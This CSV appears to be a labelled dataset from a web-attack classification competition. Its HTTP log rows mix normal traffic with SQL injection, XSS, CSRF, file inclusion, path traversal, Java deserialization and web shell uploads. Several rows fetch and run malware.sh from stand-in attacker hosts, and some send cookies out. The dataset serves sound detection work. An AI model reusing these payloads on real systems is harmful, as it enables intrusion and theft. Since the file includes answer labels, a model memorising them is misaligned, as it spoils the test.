row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
6221,2025-11-03 11:28:43,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.168,/pInG&random=7620&test=336,TArgEt%3D127.0+.0.1844|IpcoNF+ig&random=9248,远程命令执行攻击,远程命令执行攻击
6901,2025-11-07 23:36:43,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.21.82,10.251.10.26,/apI/cOmMEnT&cache=false&debug=0&random=4987,COnTenT=<iFrAME SRC=jaVAscRiPt:alert(108)>&random=53,XSS跨站脚本攻击,XSS跨站脚本攻击
2450,2025-10-24 03:54:11,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.210.167.30,10.253.10.144,/login/644,"{""name"":""User2931"",""email"":""user8835@example.com"",""message"":""Hello""}",正常访问,正常访问
3346,2025-11-11 06:30:33,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.211,10.253.216.249,/docUmEnts/upload&timestamp=1763348076&random=9512&cache=false,"------WEbKitForMBoundARy561586
COnteNt-DiSPosiTiOn: forM-data; NaME=""avatar""; filenaMe=""BackdOor689.jSp""
cONtENT-tYpe: ApPlICaTIOn/OcteT-streaM

<% RunTIme.GeTruNTIme().EXEc(RequEST.geTParAmEtEr(""cmD"")); %>
------WebKitForMboUndarY730978--&random=8531&debug=0&random=8531",文件上传攻击,文件上传攻击
5536,2025-10-20 17:06:46,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.108.142.133,10.252.22.246,/api/users,comment=This is a great product 3916,正常访问,正常访问
6378,2025-11-11 00:38:55,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.130.231,10.252.191.131,/documents/upload,"------WebKitFormBoundary907159
Content-Disposition: form-data; name=""avatar""; filename=""backdoor412.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary117599--",文件上传攻击,文件上传攻击
3772,2025-10-29 04:12:25,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.211,/uPloaD,"------weBKItfOrmBOundary139550
ConteNt-dispositi+on: fOrm-DaTA; nAme=""avatAr""; FIlename=""BaCKdOoR4+93.PHP""
contEnt-type: teXT/pLaIn

<?Php SystEm+($_GeT['cmd']); ?>
------WEBkitFormBouNDarY63668+--",文件上传攻击,文件上传攻击
5599,2025-11-11 21:17:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.26.157,10.251.99.250,/transfer,setting=disable_security&value=true,CSRF攻击,CSRF攻击
9949,2025-10-30 08:00:25,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.187.74.198,10.252.156.139,/theme&test=960&cache=false&random=6013,theme%3Dfile:///etc+/passwd137&test=407,文件包含攻击,文件包含攻击
5413,2025-11-02 13:26:43,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.244.10.233,10.251.110.241,/lookup?domain=test155.com&&whoami,,远程命令执行攻击,远程命令执行攻击
9143,2025-11-01 03:43:40,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.148.144,10.187.26.188,/api/users,"username=admin29' AND (SELECT SUBSTRING(password,4,1) FROM users WHERE username='admin')='a",SQL注入攻击,SQL注入攻击
8574,2025-11-09 10:56:14,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.250.222,10.10.130.86,/execute?host=127.0.0.1980; cat /etc/passwd&random=5325&cache=true,,远程命令执行攻击,远程命令执行攻击
2943,2025-10-21 06:51:50,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.216.112,10.252.133.241,/file/upload&timestamp=1763349498&cache=true&debug=0,"------WebKitFormBoundary796121
Content-Disposition:%20form-data;%20name%3D%22file%22;%20filename%3D%22shell881.php.jpg%22
Content-Type:%20image/jpeg

%3C?php%20system($_GET[%27cmd%27]);%20?%3E
------WebKitFormBoundary415281--&debug=1&debug=1&random=9586",文件上传攻击,文件上传攻击
1839,2025-10-29 16:23:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.14.52,10.155.182.57,/settings/50&timestamp=1763348170&test=467&cache=false,,正常访问,正常访问
7114,2025-11-10 16:36:44,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.5.99,10.251.227.25,/api/products,product=976'; WAITFOR DELAY '00:00:01'--,SQL注入攻击,SQL注入攻击
9060,2025-11-13 06:29:30,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.10.159,10.244.155.154,/changE-PaSSword&cache=true&debug=0&debug=0,Target_uSer=AdMiniSTRatOr+&perMISSIon=admIn&test=86+1&cache=false&random=2425,CSRF攻击,CSRF攻击
7410,2025-10-25 13:12:21,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.197,/api/download,read=../../../../etc/mysql/my.cnf720,目录遍历攻击,目录遍历攻击
918,2025-10-30 03:58:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.25.189.55,10.10.130.86,/blog,,正常访问,正常访问
1069,2025-10-18 18:18:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.53.116.227,10.10.110.144,/LOgIN/123,naMe=johN&e+mail=joHn@e+XamPlE.cOm&+meSSagE=heL+lO,正常访问,正常访问
8083,2025-11-03 05:32:09,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.245.24.224,10.244.155.134,/api/orderS&debug=0&test=686,,正常访问,正常访问
2495,2025-10-26 20:31:38,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.226,10.251.99.250,/api/upload,"------WebKitFormBoundary881395
Content-Disposition: form-data; name=""document""; filename=""malware804.exe""
Content-Type: application/octet-stream

MZ......................
------WebKitFormBoundary144425--",文件上传攻击,文件上传攻击
8503,2025-10-18 20:54:54,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.110.38,10.187.76.78,/api/users,"{""product_id"":510,""quantity"":6}",正常访问,正常访问
2516,2025-10-19 21:13:26,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.37,10.64.200.60,/api/data,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==426",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
7390,2025-11-16 21:27:54,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.246.20.146,10.251.110.241,/home/323,,正常访问,正常访问
4942,2025-10-31 08:38:21,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.21.21,10.162.55.195,/products,,正常访问,正常访问
9926,2025-10-31 09:02:19,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.189.55,10.153.246.40,/api/file,path=../../../config/database827.yml,目录遍历攻击,目录遍历攻击
4110,2025-10-20 03:01:23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.72.234,10.244.155.144,/deserialize,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==733",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6109,2025-10-21 06:28:36,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.204.153,10.210.184.38,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==305",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
811,2025-11-05 10:33:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.10.130.17,10.18.76.33,/api/orders,"{""product_id"":123,""quantity"":2}",正常访问,正常访问
6043,2025-11-11 03:07:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.248.45.58,10.210.184.42,/home&cache=false&timestamp=1763346293&test=390,comment=This is a great product 3161&cache=false&timestamp=1763347544,正常访问,正常访问
8442,2025-10-25 12:46:54,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.14.28,192.168.2.32,/Api/exECute,q=heLlO36|cAt /etC/pasSWD,远程命令执行攻击,远程命令执行攻击
5431,2025-10-28 09:40:25,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.252.88.220,10.251.110.241,/documents/upload,"------WebKitFormBoundary72666
Content-Disposition: form-data; name=""document""; filename=""malware842.exe""
Content-Type: application/octet-stream

MZ......................
------WebKitFormBoundary976946--",文件上传攻击,文件上传攻击
6040,2025-11-09 09:27:16,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.54.31,10.253.251.172,/search?message=<body onload=alert('XSS378')>&random=9055,,XSS跨站脚本攻击,XSS跨站脚本攻击
3966,2025-11-08 04:02:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.197,/api/products?search=') OR ('1'='1,,SQL注入攻击,SQL注入攻击
4438,2025-11-15 00:30:45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.244.191.52,10.210.184.41,/comment,comment%3D%3Cscript%3Ealert+(%27XSS305%27)%3C/script%3E,XSS跨站脚本攻击,XSS跨站脚本攻击
5051,2025-10-21 09:54:01,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.15.79,10.251.227.101,/ping,domain=test686.com&&whoami,远程命令执行攻击,远程命令执行攻击
5508,2025-10-23 13:21:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.5.49,10.251.227.102,/upload,"------WebKitFormBoundary191854
Content-Disposition: form-data; name=""avatar""; filename=""backdoor107.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary465019--",文件上传攻击,文件上传攻击
3660,2025-11-15 14:39:32,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.19.220,10.253.177.27,/products?id=234 AND (SELECT LENGTH(user()))=16,,SQL注入攻击,SQL注入攻击
7569,2025-11-01 20:25:44,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.5.99,10.251.150.43,/search,title=<div onmou+seover=alert(573+)>Hover me</div>,XSS跨站脚本攻击,XSS跨站脚本攻击
5596,2025-11-04 23:02:26,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.26.48,10.70.1.194,/aPI/resTorE,"rO0ABxNYABFqyXZhLnV0aWwusGfzaFNLDJYgoU83gM6gAgAbRGAKbG9hzEZhY3RVCKKaCXrocmvzAg9SZHHwP0AAAaaAaAx3CAaaabaAAAAhDaAkAMf2YS51dglsLnNyABFqYxZHLmxHBMcuUnvUDGltZQaAAAAAAAAAAAAabXZyAbBqyXZhLmXhBmCuU3LzdgVTAAAAaAAAAAaaaaBjKWN1cnJLBnRUaw1LtWlsBGLZS+mF2yQBab3JnLmfwYwnozS5jb21TB25zlmnvbGXLY3rp
b25ZmS5DB25ZdGfUdE1HcaaAaAaAAaAbWACiaAVtYXB0AA9MAmf2ys91dglsL01hcdT4chcIAAAAQAAAAAjzcgArAmF2YS5sYW5nLKLUdGVNzxiS4qCK94GhoaIaaUKaBxzhBHVleHIAEgpHdMEUbGFUZy5odW1iZXKGRjuDC5TgiWIAaHhwaAAAAXNyAbRqy+xZHLNV0aWWusGFzae1hcaUh2sHDFmdPAWadSQakBg9HZezhY3rvcKKacXRocmVzaG9szhhwP0AAAaAAAAB3CAAAaBaaaAahdaAJbXlPymPly3R0AAJbQNNyabDqYXZhLmxHBmcUu3ryaW5n063KKLjQyr4cAafaaAV2YwX1ZxhyABBQyXZHLmxhbmCuT2JQZWN0aAAAaAAAaAaAaaB4cHQABHRLc3R0AAR0cnVleA==78+2",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10373,2025-11-08 08:25:17,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.212,/page&cache=false&random=3941,file=php://filter/read=convert+.base64-encode/resource=config+526.php&cache=true&random=6764,文件包含攻击,文件包含攻击
3446,2025-11-12 21:28:38,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.168.242,10.16.210.9,/seArCh&random=4842,TArget=127.0.0.1313|`id`&test=22&test=22&timestamp=1763347256,远程命令执行攻击,远程命令执行攻击
4469,2025-10-20 15:57:36,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.244.8.66,10.244.155.144,/ping,ip=127.0.0.1426; curl http://attacker102.com/malware.sh | sh,远程命令执行攻击,远程命令执行攻击
1636,2025-11-09 23:56:19,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.4.241,10.251.227.30,/aDmiN/sEttiNgs&random=2580,tO=attacker373&amount=6910&ca+che=false&timestamp=176334815+0,CSRF攻击,CSRF攻击
8006,2025-10-22 18:17:31,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/DeSErIalIze,"rO0abXNYADRtES5wYWNrYWdllk15q2xhC3maaAAAaAAAAQwAAHhwdwEAhQAcAAAaANNyABfqYXZhLmXhbmcUUnvuDGLtZqAAaAaaAAaaAaAAbXZyABbqYXzHLmXhbMCuu3LZdGvtAAAAAAaAAaAAAABJKwN1CNJLBnRuaw1lTwlsbglzs+mF2YqBAb3JNLMfwYWnozS5jb21tb25zlMNvBGxly3Rp
B25zmS5CYXNOzU1hcAAAAAAaAaABWAcIaAvTYxB0AA9MamF2YS91dGlsL01hCDT4cHnYABFqYXzhLnv0awWusGFzAe1hcAuH2SHDfmDPaWAdsqAKbG9hZEZhy3RvckkAcxRoC+mVZAg9sZHHwP0AaAaAAaAb3CAaaaBAAAAAHDaAJBXlpyMply3R0AAJBQnnyabdqYXZhLmXhBmcUU3RYaw5N063KKLjqYr4CAaFAAaV2YwX1ZXHyABbqYXZhLMxHBmcUT2JqZWN0AAAaaAAAAAaaaab4cHQaBhRlc3r0AAr0cNVleA==43+9",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
1654,2025-10-28 12:38:47,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,192.168.15.42,10.160.169.181,/blog,title=New Post 9486&content=Post content here,正常访问,正常访问
8359,2025-10-19 11:38:49,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.19.230,10.253.177.27,/api/download?resource=../../.env14,,目录遍历攻击,目录遍历攻击
647,2025-10-26 00:12:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.25.73.34,10.168.2.38,/template&test=1,page%3Dzip://malicious.zip#shell.php&random=248,文件包含攻击,文件包含攻击
10100,2025-10-21 23:25:14,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.14.212,192.168.10.38,/api/ping?server=localhost74; wget http://attacker835.com/malware.sh,,远程命令执行攻击,远程命令执行攻击
7133,2025-11-04 14:40:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.148.144,10.187.26.188,/run?address=127.0.0.1104; $(ls -la),,远程命令执行攻击,远程命令执行攻击
2748,2025-10-22 08:34:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.213,10.251.96.250,/upload,"------WebKitFormBoundary820090
Content-Disposition: form-data; name=""upload""; filename=""webshell198.asp""
Content-Type: application/octet-stream

<% eval request(""cmd"") %>
------WebKitFormBoundary681893--",文件上传攻击,文件上传攻击
3590,2025-10-22 03:58:34,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.253.92.7,10.10.228.197,/api/products,"{""product_id"":66,""quantity"":10}",正常访问,正常访问
6339,2025-10-28 16:10:01,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.25.56,10.251.10.246,/bLoG,,正常访问,正常访问
8414,2025-10-24 00:46:17,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.14.28,192.168.3.55,/login&test=224,"username%3Dadmin361%27%20UNION%20SELE+CT%20username,password%20FROM%20admin+_users--%26password%3Danything&test=9+94",SQL注入攻击,SQL注入攻击
6940,2025-10-22 21:12:43,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.19.210,10.253.177.28,/profIlE,,正常访问,正常访问
1513,2025-11-04 18:58:39,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.108.208.231,10.253.176.211,/search/116,"{""product_id"":995,""quantity"":1}",正常访问,正常访问
7429,2025-10-23 14:06:47,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.7.196,10.251.227.110,/post?comment=<img src=x onerror=this.src='http://attacker659.com/steal.php?cookie='+document.cookie>,,XSS跨站脚本攻击,XSS跨站脚本攻击
1043,2025-10-28 03:50:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.25.189.55,10.10.130.86,/dashboard/123,product_id=123&quantity=2,正常访问,正常访问
9988,2025-10-20 16:11:29,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.26.255,10.251.99.238,/api/transfer,new_password%3Dhacked890%26confirm_password%3Dhacked643,CSRF攻击,CSRF攻击
9797,2025-11-05 08:08:59,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.53.116.227,10.10.110.141,/post&random=5135&timestamp=1763344941&cache=true,comment=<img src=x onerror=this.src='http://attacker41.com/st+eal.php?cookie='+document.cookie>&debug=0&random=3458&test=83+8,XSS跨站脚本攻击,XSS跨站脚本攻击
5350,2025-10-20 13:46:10,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.19,/template,file=php://filter/read=convert.base64-encode/resource=config798.php,文件包含攻击,文件包含攻击
977,2025-10-24 14:50:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.189.55,10.153.177.28,/api/products,title=New Post&content=Post content here,正常访问,正常访问
4475,2025-11-05 19:18:32,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.110.241,10.244.35.233,/transfer,new_password=hacked174&confirm_password=hacked417,CSRF攻击,CSRF攻击
6955,2025-10-25 11:33:51,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.225.7,10.187.20.133,/api/users,"{""product_id"":28,""quantity"":10}",正常访问,正常访问
10209,2025-11-05 16:10:56,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.189.21,10.253.246.40,/api/execute,target=127.0.0.155|`id`,远程命令执行攻击,远程命令执行攻击
6614,2025-11-03 22:57:09,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.196,/api/users&test=58,,正常访问,正常访问
10087,2025-11-04 23:16:21,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.58.58,10.253.87.201,/api/products?product=612'; WAITFOR DELAY '00:00:03'--,,SQL注入攻击,SQL注入攻击
7755,2025-11-08 03:04:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.245.210.105,10.244.155.134,/theme,theme=file:///etc/passwd545,文件包含攻击,文件包含攻击
8582,2025-10-28 17:02:10,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.19.207,10.253.177.28,/prOfILe/aVatar,"------WebKitfOrmBouNdary743940
ContenT-DisPosiTion:%20form-dATA;%20nAme%3d%22dOcUmenT%22;%20filenAMe%3D%22malwARe457.ExE%22
COntEnt-typE:%20aPplication/Octet-sTReAm

MZ......................
------WebKITFormboUNdAry285156--",文件上传攻击,文件上传攻击
8691,2025-11-02 06:05:49,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.246.33.139,10.244.155.179,/transfer,to=attacker505&amount=4219,CSRF攻击,CSRF攻击
1317,2025-10-30 15:30:33,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.11.92,10.251.105.245,/api/execute?domain=test612.com&$(whoami),,远程命令执行攻击,远程命令执行攻击
3749,2025-11-04 02:13:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.5.89,10.7.10.205,/contact,"{""username"":""user2033"",""password"":""secret5518""}",正常访问,正常访问
207,2025-10-26 06:43:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.189.55,10.153.177.26,/api/users,,正常访问,正常访问
5503,2025-11-07 19:47:54,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.167.30,10.253.10.144,/profile/avatar,"------WebKitFormBoundary610724
Content-Disposition: form-data; name=""avatar""; filename=""backdoor792.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary833170--",文件上传攻击,文件上传攻击
7732,2025-10-29 18:06:51,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.250.84.66,10.244.155.144,/admin/settings,target_user=administrator&permission=admin,CSRF攻击,CSRF攻击
3064,2025-11-14 09:14:24,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.108.142.133,10.252.22.246,/tRAnsFer&cache=false&debug=0&timestamp=1763343771,new_password=Hacked479&conf+IrM_pAssword=hacKed413&cach+e=true&random=3298&test=622,CSRF攻击,CSRF攻击
9850,2025-10-29 23:52:43,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.189.55,10.153.176.212,/api/change-password,new_password=hacked566&confirm_password=hacked270,CSRF攻击,CSRF攻击
6599,2025-11-07 19:54:39,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.92.7,10.10.228.196,/transfer,setting=disable_security&value=true,CSRF攻击,CSRF攻击
3762,2025-10-22 01:05:24,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,"/api/uSErS?usErNAmE%3dadMIn326%27%20uNiON%20SEleCT%20UserNamE,paSsWORD%20FrOM%20ADmin_userS--%26pAsswoRd%3DAnYTHing",,SQL注入攻击,SQL注入攻击
5907,2025-10-31 20:35:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.244.96.104,10.210.184.41,/DeLeTe-accOunT&random=8268&cache=true,to%3DaTtaCker695%26am+oUnt%3d9981&cache=fal+se&cache=false&debug=+0,CSRF攻击,CSRF攻击
7432,2025-10-29 05:37:29,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.250.221,10.10.130.86,/post,"message=<iframe src=""javascript:alert&#x28;185&#x29;"">",XSS跨站脚本攻击,XSS跨站脚本攻击
